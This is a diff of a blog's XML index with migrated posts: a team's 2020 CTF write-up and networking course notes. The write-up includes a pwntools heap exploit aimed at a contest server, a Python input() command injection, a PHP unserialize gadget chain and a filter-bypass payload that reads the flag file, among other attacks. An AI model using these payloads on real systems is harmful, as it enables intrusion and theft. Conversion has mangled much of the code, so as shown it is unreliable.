学生多次重置，重置后加载任务过多，导致云环境机器负载较大，响应延迟。<br>总共有700多个队伍，3500多台虚拟机，全部启动起来需要2个小时，所以比赛前红亚这边提前了2个小时把所有机器启动起来。<br>竞赛开始前我们是提前4、5个小时开启虚拟机的，重置的操作竞赛系统是允许的，云平台按任务分配规则重置你们的虚拟机，这个情况，只是在竞赛时间内云平台没给你重置成功，不是竞赛系统重置虚拟机。</p>
+<pre><code class="说出这样的话您不觉着搞笑吗，且不说技术上这是不是难事，您这不就是在说，我们没有能力举办这样的比赛，所以出了问题不归我管。">且不是系统设计的是否存在问题，但凡红亚在比赛之前测试过，也不至于出现这种情况。没有能力，为啥要采用这样的形式。而且这本就是将两个分开的比赛放在了一起举行，呵呵。
+一句话，这就是你们考虑不周。 这让我想起了最近出现的高考报名系统出现故障的问题，虽然教育局没有做出道歉和补偿，但是我相信过不了多久就会问责的。
+
+</code></pre>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>爆炒腰花-2020国赛WP</title>
+    <url>/2020/08/21/cnblog_13542994/</url>
+    <content><![CDATA[<h1 id="这是👉爆炒腰花-2020国赛WP👈的摘要"><a href="#这是👉爆炒腰花-2020国赛WP👈的摘要" class="headerlink" title="这是👉爆炒腰花-2020国赛WP👈的摘要"></a><a href="../../../../2020/08/21/cnblog_13542994/">这是👉爆炒腰花-2020国赛WP👈的摘要</a></h1><a id="more"></a>
+<p>心疼北邮第三第四的小可爱三秒 全队的wp，web手不记得是WM原题，已经被我埋了 # 逆向 ## z3<br><img src="https://uploader.shimo.im/f/jWKvMwxpBP3ajRU6.png!thumbnail" alt="图片"> 结合题目名称<br>和这一大坨方程式想到了Z3 不多BB z3 一把梭 val的值可以写个IDapython脚本提取出来 ```plain from z3 import *<br>s=Solver() a1=[Int(‘a1[%d]’%i) for i in range(42)] val=[20247,40182,36315,<br>36518,26921,39185,16546, 12094,25270,19330,18540,16386,<br>21207,11759,10460,25613,21135,24891,18305,<br>27415,12855,10899,24927,20670,22926,18006,<br>23345,12602,12304,26622,19807,22747,14233,24736, 10064,14169,<br>35155,28962,33273,21796,35185,14877] s.add(val[0] == 34 * a1[3] + 12 * a1[0] +<br>53 * a1[1] + 6 * a1[2] + 58 * a1[4] + 36 * a1[5] + a1[6]) s.add(val[1]== 27 *<br>a1[4] + 73 * a1[3] + 12 * a1[2] + 83 * a1[0] + 85 * a1[1] + 96 * a1[5] + 52 *<br>a1[6]) s.add(val[2] == 24 * a1[2] + 78 * a1[0] + 53 * a1[1] + 36 * a1[3] + 86</p>
+<ul>
+<li>a1[4] + 25 * a1[5] + 46 * a1[6]) s.add(val[3]== 78 * a1[1] + 39 * a1[0] + 52</li>
+<li>a1[2] + 9 * a1[3] + 62 * a1[4] + 37 * a1[5] + 84 * a1[6]) s.add(val[4]== 48</li>
+<li>a1[4] + 14 * a1[2] + 23 * a1[0] + 6 * a1[1] + 74 * a1[3] + 12 * a1[5] + 83 *<br>a1[6]) s.add(val[5]== 15 * a1[5] + 48 * a1[4] + 92 * a1[2] + 85 * a1[1] + 27 *<br>a1[0] + 42 * a1[3] + 72 * a1[6]) s.add(val[6] == 26 * a1[5] + 67 * a1[3] + 6 *<br>a1[1] + 4 * a1[0] + 3 * a1[2] + 68 * a1[6]) s.add(val[7] == 34 * a1[10] + 12 *<br>a1[7] + 53 * a1[8] + 6 * a1[9] + 58 * a1[11] + 36 * a1[12] + a1[13])<br>s.add(val[8] == 27 * a1[11] + 73 * a1[10] + 12 * a1[9] + 83 * a1[7] + 85 *<br>a1[8] + 96 * a1[12] + 52 * a1[13]) s.add(val[9] == 24 * a1[9] + 78 * a1[7] +<br>53 * a1[8] + 36 * a1[10] + 86 * a1[11] + 25 * a1[12] + 46 * a1[13])<br>s.add(val[10] == 78 * a1[8] + 39 * a1[7] + 52 * a1[9] + 9 * a1[10] + 62 *<br>a1[11] + 37 * a1[12] + 84 * a1[13]) s.add(val[11]== 48 * a1[11] + 14 * a1[9] +<br>23 * a1[7] + 6 * a1[8] + 74 * a1[10] + 12 * a1[12] + 83 * a1[13])<br>s.add(val[12]== 15 * a1[12] + 48 * a1[11] + 92 * a1[9] + 85 * a1[8] + 27 *<br>a1[7] + 42 * a1[10] + 72 * a1[13]) s.add(val[13]== 26 * a1[12] + 67 * a1[10] +<br>6 * a1[8] + 4 * a1[7] + 3 * a1[9] + 68 * a1[13]) s.add(val[14]== 34 * a1[17] +<br>12 * a1[14] + 53 * a1[15] + 6 * a1[16] + 58 * a1[18] + 36 * a1[19] + a1[20])<br>s.add(val[15]== 27 * a1[18] + 73 * a1[17] + 12 * a1[16] + 83 * a1[14] + 85 *<br>a1[15] + 96 * a1[19] + 52 * a1[20]) s.add(val[16]== 24 * a1[16] + 78 * a1[14]</li>
+</ul>
+<ul>
+<li>53 * a1[15] + 36 * a1[17] + 86 * a1[18] + 25 * a1[19] + 46 * a1[20])<br>s.add(val[17]== 78 * a1[15] + 39 * a1[14] + 52 * a1[16] + 9 * a1[17] + 62 *<br>a1[18] + 37 * a1[19] + 84 * a1[20]) s.add(val[18]== 48 * a1[18] + 14 * a1[16]</li>
+<li>23 * a1[14] + 6 * a1[15] + 74 * a1[17] + 12 * a1[19] + 83 * a1[20])<br>s.add(val[19] == 15 * a1[19] + 48 * a1[18] + 92 * a1[16] + 85 * a1[15] + 27 *<br>a1[14] + 42 * a1[17] + 72 * a1[20]) s.add(val[20]== 26 * a1[19] + 67 * a1[17]</li>
+<li>6 * a1[15] + 4 * a1[14] + 3 * a1[16] + 68 * a1[20]) s.add(val[21] == 34 *<br>a1[24] + 12 * a1[21] + 53 * a1[22] + 6 * a1[23] + 58 * a1[25] + 36 * a1[26] +<br>a1[27]) s.add(val[22]== 27 * a1[25] + 73 * a1[24] + 12 * a1[23] + 83 * a1[21]</li>
+<li>85 * a1[22] + 96 * a1[26] + 52 * a1[27]) s.add(val[23]== 24 * a1[23] + 78 *<br>a1[21] + 53 * a1[22] + 36 * a1[24] + 86 * a1[25] + 25 * a1[26] + 46 * a1[27])<br>s.add(val[24]== 78 * a1[22] + 39 * a1[21] + 52 * a1[23] + 9 * a1[24] + 62 *<br>a1[25] + 37 * a1[26] + 84 * a1[27]) s.add(val[25]== 48 * a1[25] + 14 * a1[23]</li>
+<li>23 * a1[21] + 6 * a1[22] + 74 * a1[24] + 12 * a1[26] + 83 * a1[27])<br>s.add(val[26]== 15 * a1[26] + 48 * a1[25] + 92 * a1[23] + 85 * a1[22] + 27 *<br>a1[21] + 42 * a1[24] + 72 * a1[27]) s.add(val[27]== 26 * a1[26] + 67 * a1[24]</li>
+<li>6 * a1[22] + 4 * a1[21] + 3 * a1[23] + 68 * a1[27]) s.add(val[28]== 34 *<br>a1[31] + 12 * a1[28] + 53 * a1[29] + 6 * a1[30] + 58 * a1[32] + 36 * a1[33] +<br>a1[34]) s.add(val[29] == 27 * a1[32] + 73 * a1[31] + 12 * a1[30] + 83 * a1[28]</li>
+<li>85 * a1[29] + 96 * a1[33] + 52 * a1[34]) s.add(val[30]== 24 * a1[30] + 78 *<br>a1[28] + 53 * a1[29] + 36 * a1[31] + 86 * a1[32] + 25 * a1[33] + 46 * a1[34])<br>s.add(val[31]== 78 * a1[29] + 39 * a1[28] + 52 * a1[30] + 9 * a1[31] + 62 *<br>a1[32] + 37 * a1[33] + 84 * a1[34]) s.add(val[32]== 48 * a1[32] + 14 * a1[30]</li>
+<li>23 * a1[28] + 6 * a1[29] + 74 * a1[31] + 12 * a1[33] + 83 * a1[34])<br>s.add(val[33]== 15 * a1[33] + 48 * a1[32] + 92 * a1[30] + 85 * a1[29] + 27 *<br>a1[28] + 42 * a1[31] + 72 * a1[34]) s.add(val[34]== 26 * a1[33] + 67 * a1[31]</li>
+<li>6 * a1[29] + 4 * a1[28] + 3 * a1[30] + 68 * a1[34]) s.add(val[35]== 34 *<br>a1[38] + 12 * a1[35] + 53 * a1[36] + 6 * a1[37] + 58 * a1[39] + 36 * a1[40] +<br>a1[41]) s.add(val[36]== 27 * a1[39] + 73 * a1[38] + 12 * a1[37] + 83 * a1[35]</li>
+<li>85 * a1[36] + 96 * a1[40] + 52 * a1[41]) s.add(val[37]== 24 * a1[37] + 78 *<br>a1[35] + 53 * a1[36] + 36 * a1[38] + 86 * a1[39] + 25 * a1[40] + 46 * a1[41])<br>s.add(val[38]== 78 * a1[36] + 39 * a1[35] + 52 * a1[37] + 9 * a1[38] + 62 *<br>a1[39] + 37 * a1[40] + 84 * a1[41]) s.add(val[39]== 48 * a1[39] + 14 * a1[37]</li>
+<li>23 * a1[35] + 6 * a1[36] + 74 * a1[38] + 12 * a1[40] + 83 * a1[41])<br>s.add(val[40]== 15 * a1[40] + 48 * a1[39] + 92 * a1[37] + 85 * a1[36] + 27 *<br>a1[35] + 42 * a1[38] + 72 * a1[41]) s.add(val[41] == 26 * a1[40] + 67 * a1[38]</li>
+<li>6 * a1[36] + 4 * a1[35] + 3 * a1[37] + 68 * a1[41]) print s.check()<br>print(s.model()) a1=[0]<em>42 a1[14]=54 a1[25]=57 a1[0]=102 a1[15]=51 a1[37]=101<br>a1[36]=102 a1[7]=49 a1[16]=98 a1[23]=45 a1[18]=45 a1[30]=101 a1[28]=45<br>a1[2]=97 a1[4]=123 a1[3]=103 a1[21]=49 a1[24]=57 a1[29]=54 a1[17]=57 a1[22]=56<br>a1[31]=49 a1[33]=99 a1[38]=54 a1[11]=52 a1[26]=48 a1[39]=52 a1[8]=55<br>a1[10]=100 a1[40]=56 a1[19]=52 a1[12]=51 a1[32]=52 a1[1]=108 a1[35]=97<br>a1[5]=55 a1[9]=49 a1[41]=125 a1[34]=50 a1[27]=101 a1[20]=101 a1[13]=45<br>a1[6]=101 s=’’ for i in range(42): s+=chr(a1[i]) print s <code>## hyperthreading ![图片](https://uploader.shimo.im/f/G90W0lapBsfd86Ja.png!thumbnail) IDA strings 定位到关键函数 发现creathread函数 对于输入内容的加密内容应该在子线程中 跳转到strataddress 发现代码从0x401151开始不对 OD调试 ![图片](https://uploader.shimo.im/f/SizsKDVFP078eN4g.png!thumbnail) 发现IDA分析错位 ![图片](https://uploader.shimo.im/f/CX1x6ysudgqgBcWO.png!thumbnail) 存在反调试和花指令，去之 ![图片](https://uploader.shimo.im/f/Fv5cOEvqxrvUwvBB.png!thumbnail) 其中有死循环反调试和花指令（0xeb） 最后还原出来的加密逻辑是移位异或再加0x23 写脚本</code>plain #fromidaapiimport</em><br>#startaddr=0x402150 #offset=42 #a=[] #foriinrange(offset): #<br>a.append(Byte(startaddr+i)) #print a a=[221,91,158,29,32,158,144,145,144,144,<br>145,146,222,139,17,209,30,158,139, 81,17,80,81,139, 158,93,93,17,139,144,18,<br>145,80,18,210,145,146,30, 158,144,210,159] print(len(a)) s=’’ for j in<br>range(42): for i in range(0x20,0x7f): tmp=((((i&gt;&gt;2)^(i&lt;&lt;6))^0x23)+0x23)&amp;0xff<br>if (tmp==a[j]): s+=chr(i) print (s) <code># pwn ## babyjsc： 刚拿到题目啥也没看懂 好像是个JS解析，不懂 找了server.py ![图片](https://uploader.shimo.im/f/9M6HwsBLBELnyIJW.png!thumbnail) 可以发现程序的交互部分是由server.py实现 # ![图片](https://uploader.shimo.im/f/nuArrQj1kx2SmaK0.png!thumbnail) python2 input函数非常危险 之前做过一个CTF就是拿这个出题的导致可以直接getshell 具体可以参考这篇文章[https://www.cnblogs.com/heycomputer/articles/10537633.html](https://www.cnblogs.com/heycomputer/articles/10537633.html) 直接输入 **__import__(&#39;os&#39;).system(&#39;cat /home/ctf/flag&#39;)** 我估计这是个非预期 23333 ## safebox ![图片](https://uploader.shimo.im/f/Vd6sY4FB2HqSSRR6.png!thumbnail) 典型的菜单堆 ![图片](https://uploader.shimo.im/f/aP4BBG28vjyLQH6n.png!thumbnail) 最多0xf个堆块大小限制为0xfff 可以看到存在off-by-one 漏洞 可以通过off-by-one构造chunk overlapping 再申请一部分出来 让main_arena的地址进入tcache链 再修改低位字节爆破stdout 最后再构造overlapping实现tcache dup</code>plain from pwn import * from time import sleep context.log_level = ‘debug’<h1 id="p-process-“-pwn”-p-remote-‘101-200-53-148’-34521-elf-ELF-‘-pwn’-libc"><a href="#p-process-“-pwn”-p-remote-‘101-200-53-148’-34521-elf-ELF-‘-pwn’-libc" class="headerlink" title="p=process(“./pwn”) p = remote(‘101.200.53.148’,34521) elf=ELF(‘./pwn’) libc"></a>p=process(“./pwn”) p = remote(‘101.200.53.148’,34521) elf=ELF(‘./pwn’) libc</h1>= ELF(‘./libc.2.23.so’) def add(idx,size,content): p.recvuntil(‘&gt;&gt;&gt;’)<br>p.sendline(“1”) p.recvuntil(“idx:”) p.sendline(str(idx)) p.recvuntil(“len:”)<br>p.sendline(str(size)) p.recvuntil(“content:”) p.send(content) def delete(idx):<br>p.recvuntil(‘&gt;&gt;&gt;’) p.sendline(“2”) p.recvuntil(“idx:”) p.sendline(str(idx))<br>def get_shell(): add(0,0x18,’aaaa’) add(1,0x108,’bbbb’) add(2,0x60,’cccc’)<br>add(3,0x60,’dddd’) add(4,0xf8,’eeee’) add(5,0x20,’ffff’) delete(0)<br>add(0,0x18,’a’*0x18+’\xf1’) delete(2) delete(3) delete(1) add(1,0x108,’aaaa’)<br>add(2,0x70,p16(0x2620-0x43)) delete(1) add(1,0x108,’a’*0x108+’\x71’)<br>add(3,0x60,’bbbb’) add(6,0x60,’cccc’)<br>payload=’a’*0x33+p64(0xfbad1800)+p64(0)*3+’\x00’ add(7,0x68,payload)#爆破libc<br>多试几次就行 #pause() libc_base =<br>u64(p.recvuntil(‘\x7f’)[-6:].ljust(8,’\x00’))-0x3c5600 print hex(libc_base)<br>free_hook = libc_base + 0x3c67a8 malloc_hook = libc_base+0x3c4b10<br>onegadget=libc_base+0xf1207 p.sendline(“1”) p.recvuntil(“idx:”)<br>p.sendline(str(8)) p.recvuntil(“len:”) p.sendline(str(0x50))<br>p.recvuntil(“content:”) p.send(‘a’) add(8,0x18,’aaaa’) add(9,0x108,’bbbb’)<br>add(10,0x68,’cccc’) add(11,0x68,’dddd’) add(12,0x68,’eeee’) delete(8)<br>add(0,0x18,’a’*0x18+’\xf1’) delete(10) delete(11) delete(9)<br>add(9,0x108,’bbbb’) add(10,0x70,p64(malloc_hook-0x23)) delete(9)<br>add(9,0x108,’a’*0x108+’\x71’) add(11,0x68,’dddd’) add(13,0x68,’dddd’)<br>add(14,0x60,’a’*0x13+p64(onegadget))#修改malloc_hook为one_gadget p.sendline(“1”)<br>p.recvuntil(“idx:”) p.sendline(str(15)) p.recvuntil(“len:”) p.send(‘aaaa’)<br>p.interactive() get_shell() <code># # MISC ## 签到 直接给了 ## flag：flag&#123;同舟共济扬帆起，乘风破浪万里航。&#125; ## the_best_ctf_game ![图片](https://uploader.shimo.im/f/MVXIAWJiGoWAb3rY.png!thumbnail) 直接在文件里能读出来 flag： flag&#123;65e02f26-0d6e-463f-bc63-2df733e47fbe&#125; ## 电脑被黑 ![图片](https://uploader.shimo.im/f/dl9VOzOiZjHInysi.png!thumbnail) 取证大师能直接恢复出flag.txt 发现文件夹下demo是个加密程序，逆向一下 ![图片](https://uploader.shimo.im/f/o3pSuQsKvwEyPvPP.png!thumbnail) 编写逆向代码</code>plain flie1=open(“flag.txt”,”rb”) flie2=open(“fakeflag.txt”,”rb”) v4 = 34<br>v5 = 0 buff=flie1.read() for i in buff: c=(i^v4)-v5 v4 = (v4+34)&amp;0xff<br>v5=(v5+2)&amp;0xf print(chr(c),end=””) <code>flag: flag&#123;e5d7c4ed-b8f6-4417-8317-b809fc26c047&#125; # WEB ## babyunserialize 看了一眼源码，眼熟，想起来是前几天WM的原题，虽然当时没做出来，但是存了wp，稍微改一下</code>plain “phpinfo”],<br>$adhoc=[“20”=&gt;[“expr”=&gt;””]], $db; function offsetExists($offset){} function<br>offsetGet($offset){} function offsetSet($offset, $value){} function<br>offsetUnset($offset){} function getIterator(){} function __construct($val){<br>$this-&gt;db = $val; } } } namespace CLI{ class Agent { protected $server=””;<br>public $events; public function __construct(){<br>$this-&gt;events=[“disconnect”=&gt;array(new \DB\SQL\Mapper(new<br>\DB\SQL\Mapper(“”)),”find”)]; $this-&gt;server=&amp;$this; } }; class WS{} }<br>namespace { echo urlencode(serialize(array(new \CLI\WS(),new \CLI\Agent())));<br>} <code>跑一下得出</code>plain<br>a%3A2%3A%7Bi%3A0%3BO%3A6%3A%22CLI%5CWS%22%3A0%3A%7B%7Di%3A1%3BO%3A9%3A%22CLI%5CAgent%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00server%22%3Br%3A3%3Bs%3A6%3A%22events%22%3Ba%3A1%3A%7Bs%3A10%3A%22disconnect%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A13%3A%22DB%5CSQL%5CMapper%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00props%22%3Ba%3A1%3A%7Bs%3A8%3A%22quotekey%22%3Bs%3A7%3A%22phpinfo%22%3B%7Ds%3A8%3A%22%00%2A%00adhoc%22%3Ba%3A1%3A%7Bi%3A20%3Ba%3A1%3A%7Bs%3A4%3A%22expr%22%3Bs%3A0%3A%22%22%3B%7D%7Ds%3A5%3A%22%00%2A%00db%22%3BO%3A13%3A%22DB%5CSQL%5CMapper%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00props%22%3Ba%3A1%3A%7Bs%3A8%3A%22quotekey%22%3Bs%3A7%3A%22phpinfo%22%3B%7Ds%3A8%3A%22%00%2A%00adhoc%22%3Ba%3A1%3A%7Bi%3A20%3Ba%3A1%3A%7Bs%3A4%3A%22expr%22%3Bs%3A0%3A%22%22%3B%7D%7Ds%3A5%3A%22%00%2A%00db%22%3Bs%3A0%3A%22%22%3B%7D%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7D%7D%7D<br><code>即</code>plain a:2:{i:0;O:6:”CLI\WS”:0:{}i:1;O:9:”CLI\Agent”:2:{s:9:” *<br>server”;r:3;s:6:”events”;a:1:{s:10:”disconnect”;a:2:{i:0;O:13:”DB\SQL\Mapper”:3:{s:8:”</li>
+</ul>
+<ul>
+<li>props”;a:1:{s:8:”quotekey”;s:7:”phpinfo”;}s:8:” *<br>adhoc”;a:1:{i:20;a:1:{s:4:”expr”;s:0:””;}}s:5:” *<br>db”;O:13:”DB\SQL\Mapper”:3:{s:8:” *<br>props”;a:1:{s:8:”quotekey”;s:7:”phpinfo”;}s:8:” *<br>adhoc”;a:1:{i:20;a:1:{s:4:”expr”;s:0:””;}}s:5:” *<br>db”;s:0:””;}}i:1;s:4:”find”;}}}} <code>提交，得到phpinfo，搜一下，得到flag ![图片](https://uploader.shimo.im/f/88D4wOwitMd55p4y.png!thumbnail) # ## easyphp ![图片](https://uploader.shimo.im/f/NlSZ2XFeyw1uf0uE.png!thumbnail) 考察fork中断 创建一个新的监听的时候会导致原来的进程中断出错，跳转至phpinfo页面，没想到直接就有flag了（没想到直接就在info里面，还以为要命令执行的说） ## easytrick 见到有php的!=和！==，以及需要md5值相等，想到利用不同的类型获取两个相同的NAN值来获取相同的md5</code>plain<br>trick1 = (string)$this-&gt;trick1; print_r($this-&gt;trick1);<br>print_r($this-&gt;trick2); print_r(md5($this-&gt;trick2));<br>print_r(md5($this-&gt;trick2)); if(strlen($this-&gt;trick1) &gt; 5 ||<br>strlen($this-&gt;trick2) &gt; 5){ die(“你太长了”); } if($this-&gt;trick1 !== $this-&gt;trick2<br>&amp;&amp; md5($this-&gt;trick1) === md5($this-&gt;trick2) &amp;&amp; $this-&gt;trick1 !=<br>$this-&gt;trick2){ echo’success’; } } } highlight_file(<strong>FILE</strong>); echo 0/0; echo<br>(string)[a]; $a=new trick(); $a-&gt;trick1=NAN; $a-&gt;trick2=0/0; $b=serialize($a);<br>print_r($b); unserialize($b); <code>payload： O:5:&quot;trick&quot;:2:&#123;s:6:&quot;trick1&quot;;d:NAN;s:6:&quot;trick2&quot;;d:NAN;&#125; receme 参考2020年赛博杯的dangerous- function，本题一样过滤了大量字符串操作函数，选择imlpode进行拼接，修改一下执行命令的部分即可获取flag payload： &#123;if:var_dump((((implode(array(fil,e_get,_con,tents)))))(((implode(array(bas,e64_,dec,ode))))(Li8uLi8uLi8uLi8uLi8uLi8uLi9mbGFn)))&#125;e&#123;else&#125;a&#123;end if&#125; # # CRYPTO ## bd 分析一下源码，d过小，想到wiener attack，先得到d，再通过</code>plain m =<br>pow(c,d,n) <code>得到flag 跑下脚本 ![图片](https://uploader.shimo.im/f/f5G9aEXACOO10trI.png!thumbnail)</code>plain<br>d=1485313191830359055093545745451584299495272920840463008756233 <code> </code>python<h1 id="coding-utf-8-Wiener-Attack-used-in-big-public-key-or-small"><a href="#coding-utf-8-Wiener-Attack-used-in-big-public-key-or-small" class="headerlink" title="-- coding: utf-8 -- # Wiener Attack, used in big public key (or small"></a>-<em>- coding: utf-8 -</em>- # Wiener Attack, used in big public key (or small</h1>private key). from gmpy2 import * # 展开为连分数 def continuedfra(x, y): cF = []<br>while y: cF += [x / y] x, y = y, x % y return cF def simplify(ctnf): numerator<br>= 0 denominator = 1 for x in ctnf[::-1]: numerator, denominator = denominator,<br>x * denominator + numerator return (numerator, denominator) # 连分数化简 def<br>calculatefrac(x, y): cF = continuedfra(x, y) cF = map(simplify, (cF[0:i] for i<br>in range(1, len(cF)))) return cF # 解韦达定理 def solve_pq(a, b, c): par = isqrt(b</li>
+<li>b - 4 * a * c) return (-b + par) / (2 * a), (-b - par) / (2 * a) def<br>wienerattack(e, n): for (d, k) in calculatefrac(e, n): if k == 0: continue if<br>(e * d - 1) % k != 0: continue phi = (e * d - 1) / k p, q = solve_pq(1, n -<br>phi + 1, n) if p * q == n: return abs(int(p)), abs(int(q)) print(‘not find!’)<br>n =<br>86966590627372918010571457840724456774194080910694231109811773050866217415975647358784246153710824794652840306389428729923771431340699346354646708396564203957270393882105042714920060055401541794748437242707186192941546185666953574082803056612193004258064074902605834799171191314001030749992715155125694272289<br>e =<br>46867417013414476511855705167486515292101865210840925173161828985833867821644239088991107524584028941183216735115986313719966458608881689802377181633111389920813814350964315420422257050287517851213109465823444767895817372377616723406116946259672358254060231210263961445286931270444042869857616609048537240249<br>c =<br>37625098109081701774571613785279343908814425141123915351527903477451570893536663171806089364574293449414561630485312247061686191366669404389142347972565020570877175992098033759403318443705791866939363061966538210758611679849037990315161035649389943256526167843576617469134413191950908582922902210791377220066<br>p, q = wienerattack(e, n) print(‘[+]Found!’, ‘\n’) print(‘ [-]p =’, p) print(‘<br>[-]q =’, q) print(‘ [-]n =’, p * q) d = invert(e, (p-1)*(q-1)) print(‘ [-]d<br>=’, d) # print(‘ [-]m is: ‘ + ‘{:x}’.format(pow(c, d, n)).decode(‘hex’), ‘\n’)<br>print(‘[!]All Done!’) m = pow(c,d,n) from Crypto.Util.number import<br>long_to_bytes print(long_to_bytes(m)) <code>## lsfr 分析代码，发现让求mark，又通过前几位为固定的字符</code>plain flag{ <code>想到B-M算法</code>plain Berlekamp-Massey 算法（B-M 算法）用于构造一个最短的 LFSR<br>以满足给定的二进制输出序列。一方面可用于寻找级数尽可能小的 LFSR 来生成随机性大的输出序列，而另一方面可用于根据已知输出序列反推 LFSR。 ```<br>用在线工具 <img src="https://uploader.shimo.im/f/Icjo4F4TGmNRL0Ai.png!thumbnail" alt="图片"> 解出mask<br><img src="https://uploader.shimo.im/f/G6dWjf7la6HqjrUp.png!thumbnail" alt="图片"><br>因为mask的长度为100,去除最后一位，逆序转为10进制，就是flag<br><img src="https://uploader.shimo.im/f/EhbIzIqey9OpvWr5.png!thumbnail" alt="图片"><br>flag{856137228707110492246853478448}</li>
+</ul>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>计网小笔记</title>
+    <url>/2020/07/24/cnblog_13374692/</url>
+    <content><![CDATA[<h1 id="这是👉计网小笔记👈的摘要"><a href="#这是👉计网小笔记👈的摘要" class="headerlink" title="这是👉计网小笔记👈的摘要"></a><a href="../../../../2020/07/24/cnblog_13374692/">这是👉计网小笔记👈的摘要</a></h1><a id="more"></a>
+<p>这个笔记怎么说呢，有部分未完成，不完全。。大家随便看看就行。 脑图，这个确实是我用心画的。。求点赞。。<br><a href="https://shimo.im/mindmaps/HVh8Rr8P9H9Qkwjg/">https://shimo.im/mindmaps/HVh8Rr8P9H9Qkwjg/</a> <code>plain 黄老师保我计网不挂科 黄老师保我计网不挂科 黄老师保我计网不挂科 浓厚师生情 浓厚师生情 浓厚师生情 </code> # 第一章 绪论 ##<br><img src="https://uploader.shimo.im/f/WwDlLRie6hrHjnVk.jpg!thumbnail" alt="图片"> ##<br>计算机网络在信息时代的作用 ## 互联网概述 ### 网络的网络 计算机网络由若干节点和链接这些节点的链路组成 ### 互联网基础结构发展的三个阶段 *<br>单个网络ARPANET向互联网发展的过程 * 建成了三级结构的互联网 * 逐渐形成了多层ISP结构的互联网 ### 互联网的标准化工作 *<br>互联网工程部IETF * 互联网研究部IRTF * 互联网草案 * 建议标准 * 互联网标准 ## 互联网的组成 * 边缘部分 用户使用 * 服务器，客户</p>
+<ul>
+<li>对等连接 * 核心部分 提供服务 * 路由器 实现分组交换的关键构建 * 电路交换 在通话的全部时间内，通话的两个用户始终占用端到端的通信资源 *<br>分组交换 分组转发 ## 计算机网络在我国的发展 ## 计算机网络的类别 ### 计算机网络的定义 * 硬件 * 应用 ## 几种不通类别的计算机网络<br>1. 按照网络的作用范围 1. 广域 2. 城域 3. 局域 2. 按照使用着分类 1. 公用 2. 专用 3.<br>用来把用户接入到互联网的网络 ## 计算机网络的性能 ### 性能指标 #### 速率 #### 带宽 #### 吞吐量 #### 时延 ####<br>时延带宽积 #### 往返时间RTT #### 利用率 ## 计算机网络的非性能特征 ## 计算机网络体系结构 ### 计算机网络体系结构的构成<br>互相通信的两个计算机系统必须高度协调，而这种协调相当复杂。“分层”可将庞大而复杂的问题，转化为若干较小的局部问题，而这些较小的局部问题易于研究和处理<br>开放系统互连基本参考模型 OSI/RM ### 协议与划分层次 这些为进行网络中的数据交换而建立的规则，标准或约定成为网络协议 要素：语法 语义 同步 好处<br>灵活性好 结构上分开 易于实现和维护 能促进标准化工作 功能 差错控制 流量控制 分段和重装 复用和转发 连接建立和释放 ### 五层协议的体系结构<br><img src="https://uploader.shimo.im/f/amcishBcLD20Hubd.png!thumbnail" alt="图片"> ### 实体 协议<br>服务和服务访问点 实体 表示 任何可以发送或接受的硬件或软件进程 协议是控制两个对等实体（多个）进行通信的规则的集合<br>在协议的控制下，两个对等实体间的通信使本层能够向上一层提供服务。要实现本层协议，还需要使用下面一层所提供的服务 ### TCP/IP的体系结构 ## 课后题<br>计算机网络的性能 1.速率 2.带宽 最高数据率 3.吞吐量 实际数据量 4.时延 发送时延+传播<del>+处理</del>+排队~ 时延带宽鸡 利用率<br>空闲时时延/（1-利用率） 1.计算机网络向用户可以提供那些服务？ 连通性和共享 2.请简述分组交换的要点 报文分组，加首部。经路由器储存转发，在目的地合并</li>
+</ul>
+<p>3.试从多个方面比较电路交换、报文交换和分组交换的主要优缺点。 电路交换：在通话的全部时间内通话的两个用户始终占用端到端的通信资源，整个报文的比特流连续<br>的从源点直达终点，线路传输效率很低。 报文交换：真个报文先传送到相邻节点，全部储存下来后查找转发表，转发到下一个节点<br>分组交换：将整个报文分为单个分组，单个分组传送到相邻节点，储存下来后查找转发表，转发到下一节点 4.为什么说因特网是自印刷术以来人类通信方面最大的变革？<br>融合其他通信网络，在信息化过程中起核心作用，提供最好的连通性和信息共享，第一次提供了各种媒体形式的实时交互能力<br>5.因特网的发展大致分为哪几个阶段？请指出这几个阶段的主要特点。 第一阶段：最初阶段，因特网是从单个网络ARPANET向互联网发展的过程。<br>第二阶段：该阶段的特点是建成了三级结构的因特网。分为主干网、地区网和校园网（企业网）。 第三阶段：这一阶段的因特网，逐渐形成了多层次ISP结构的因特网。<br>6.简述因特网标准制定的几个阶段？ 因特网草案 建议标准， 开始成为RFC文档 草案标准 因特网标准<br>7.小写和大写开头的英文名字internet和Internet再意思上有何重要区别<br><strong>intternet（互联网）：通用名词，泛指由多个计算机网络互联而成的网络，协议无特质</strong><br><strong>Inernet（因特网）：专用名词，特质采用Tcp/Ip协议的互联网络</strong> 8.计算机网络都有哪些类别？各种类别的网络都有哪些特点？ 广域网WAN<br>远程，高速，是internet的核心网 城域网MAN:城市范围，连接多个局域网 局域网LAN：校园、企业、机关、社区 个域网(pan)：个人电子设备<br>9.计算机网络中的主干网和本地接入网的主要区别是什么？ 主干网：提供远程覆盖、高速传输和路由器最优化通信<br>本地接入网：主要支持用户的访问本地，实现散户接入，速率低。 12因特网的两大组成部分（边缘部分与核心部分）的特点是什么？它们的工作方式各有 什么特点<br>边缘部分：由各主机构成，用户直接进行信息处理和信息共享低速连入核心网。 核心部分：由各路由器连网，负责为边缘部分提供高速远程分组交换。 13<br>客户服务器方式与对等通信方式的主要区别是什么？有没有相同的地方？ 前者严格区分服务和被服务者，后者无此区别。后者实际上是前者的双向应用。<br>14计算机网络有哪些常用的性能指标？ 速率，带宽，吞吐量，时延，时延带宽积，往返时间RTT，利用率 # 第二章 物理层 ## 物理层的基本概念<br>物理层考虑怎么样在各种计算机的传输媒体上传输数据比特流 * 机械特性 * 电气特性 * 功能特性 * 过程特性 ## 数据通信的基础知识 ###<br>数据通信系统的模型 源系统 原点 发送器 接受器 终点 传输系统 目的系统 * 模拟信号 * 数字信号 ### 有关通信的几个基本概念 * 常用通信模式 *<br>单向通信 （单工通信） A-&gt;b * 